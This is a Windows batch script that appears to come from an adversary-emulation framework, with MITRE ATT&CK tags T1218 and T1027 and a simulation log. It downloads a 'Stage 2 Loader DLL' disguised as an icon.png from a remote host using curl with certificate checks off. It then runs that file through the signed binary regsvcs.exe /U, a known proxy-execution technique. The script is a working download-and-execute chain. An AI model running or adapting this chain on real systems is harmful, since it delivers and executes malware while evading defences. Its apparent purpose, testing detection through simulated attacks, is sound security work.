@echo off
SETLOCAL EnableDelayedExpansion

REM Placeholder constant declarations (random-named SET vars)
SET _outDir=%APPDATA%\10961\f61e4d0b
SET _outFile=072ea935.txt
SET _hbUrl=https://10.0.0.49/stage/2/icon.png?10961-7
SET _agent=ITZEL-S2BO
SET _sim=10961
SET _endpt=7
SET _log=%PUBLIC%\\macula-simulations.log

REM Capture timestamp once
SET tsvar=!DATE!-!TIME!

REM DEBUG LOG: script start
echo [!tsvar!][DEBUG][!_agent!][!_sim!]: script_start>> "!_log!" 2>nul

REM Step 1: Heartbeat fetch – download Stage 2 Loader DLL
echo [!tsvar!][DEBUG][!_agent!][!_sim!]: heartbeat_start>> "!_log!" 2>nul
curl -k -s -o "!_outDir!\!_outFile!" "!_hbUrl!"
IF ERRORLEVEL 1 (
    SET hbResult=FAIL
    SET hbError=curl_exit_!ERRORLEVEL!
) ELSE (
    SET hbResult=OK
    SET hbError=
)
echo [!tsvar!][DEBUG][!_agent!][!_sim!]: heartbeat_result=!hbResult!>> "!_log!" 2>nul

REM Step 2: Change working directory
echo [!tsvar!][DEBUG][!_agent!][!_sim!]: chdir_start>> "!_log!" 2>nul
cd /d "!_outDir!" >nul 2>&1
IF ERRORLEVEL 1 (
    SET cdResult=FAIL
) ELSE (
    SET cdResult=0
)
echo [!tsvar!][DEBUG][!_agent!][!_sim!]: chdir_result=!cdResult!>> "!_log!" 2>nul

REM Step 3: Invoke the downloaded DLL via regsvcs.exe /U
echo [!tsvar!][DEBUG][!_agent!][!_sim!]: regsvcs_start>> "!_log!" 2>nul
%SystemRoot%\Microsoft.NET\Framework64\v4.0.30319\regsvcs.exe /U "!_outFile!" >nul 2>&1
IF ERRORLEVEL 1 (
    SET regsvcsResult=FAIL
    SET regsvcsError=errorlevel_!ERRORLEVEL!
) ELSE (
    SET regsvcsResult=OK
    SET regsvcsError=
)
echo [!tsvar!][DEBUG][!_agent!][!_sim!]: regsvcs_result=!regsvcsResult!>> "!_log!" 2>nul

REM TTP Logging
REM T1218 System Binary Proxy Execution
echo [!tsvar!][TTP][!_agent!][!_sim!]: T1218^|System Binary Proxy Execution=!regsvcsResult!:!regsvcsError!>> "!_log!" 2>nul

REM T1027 Obfuscated Files or Information
echo [!tsvar!][TTP][!_agent!][!_sim!]: T1027^|Obfuscated Files or Information=!hbResult!:!hbError!>> "!_log!" 2>nul

ENDLOCAL